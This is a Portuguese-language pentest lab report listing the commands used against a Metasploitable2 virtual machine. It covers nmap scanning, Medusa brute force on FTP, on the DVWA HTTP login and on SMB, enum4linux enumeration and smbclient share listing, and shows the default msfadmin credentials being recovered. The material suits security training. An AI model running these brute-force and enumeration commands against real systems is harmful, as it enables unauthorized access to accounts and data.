# Relatório de Comandos Utilizados - Pentest Metasploitable2

## 1. Verificar o IP da máquina Metasploitable2-Linux
**Comando:**
```bash
ip a
```
**Saída relevante:**
```
inet 192.168.56.101/24 brd 192.168.56.255 scope global eth0
```

---

## 2. Testar conectividade via ping
**Comando:**
```bash
ping -c 3 192.168.56.101
```
**Descrição:** Verifica se a máquina Metasploitable2 está acessível pela rede.

---

## 3. Verificar serviços e versões com Nmap
**Comando:**
```bash
nMap -sV -p 21,22,80,445,139 192.168.56.101
```
**Descrição:** Escaneia as portas especificadas e identifica os serviços e suas versões.

---

## 4. Testar acesso ao FTP
**Comando:**
```bash
ftp 192.168.56.101
```
**Descrição:** Tenta conectar ao serviço FTP da máquina alvo.

---

## 5. Criar lista de usuários
**Comando:**
```bash
echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt
```
**Descrição:** Gera um arquivo com possíveis nomes de usuários para força bruta.

---

## 6. Criar lista de senhas
**Comando:**
```bash
echo -e '123456\npassword\nqwerty\nmsfadmin' > pass.txt
```
**Descrição:** Gera um arquivo com senhas comuns para testes de autenticação.

---

## 7. Ataque de força bruta no FTP com Medusa
**Comando:**
```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
```
**Resultado:**
```
ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
```

---

## 8. Acessar aplicação DVWA via navegador
**URL:**
```
http://192.168.56.101/dvwa/login.php
```

---

## 9. Ataque de força bruta HTTP na DVWA
**Comando:**
```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http -m PAGE:'/dvwa/login.php' -m FORM:'username=^USER^&password=^PASS^&Login=Login' -m 'FAIL=Login failed' -t 6
```

---

## 10. Enumeração SMB com Enum4Linux
**Comando:**
```bash
enum4linux -a 192.168.56.101 | tee enum4_output.txt
```
**Descrição:** Coleta informações sobre usuários, grupos e compartilhamentos via SMB.

---

## 11. Visualizar saída da enumeração
**Comando:**
```bash
less enum4_output.txt
```

---

## 12. Criar lista de usuários SMB
**Comando:**
```bash
echo -e 'user\nmsfadmin\nservice' > smb_users.txt
```

---

## 13. Criar lista de senhas SMB
**Comando:**
```bash
echo -e 'password\n123456\nWelcome123\nmsfadmin' > senhas_spray.txt
```

---

## 14. Ataque de força bruta SMB com Medusa
**Comando:**
```bash
medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
```
**Resultado:**
```
ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
```

---

## 15. Listar compartilhamentos SMB
**Comando:**
```bash
smbclient -L //192.168.56.101 -U msfadmin
```

---
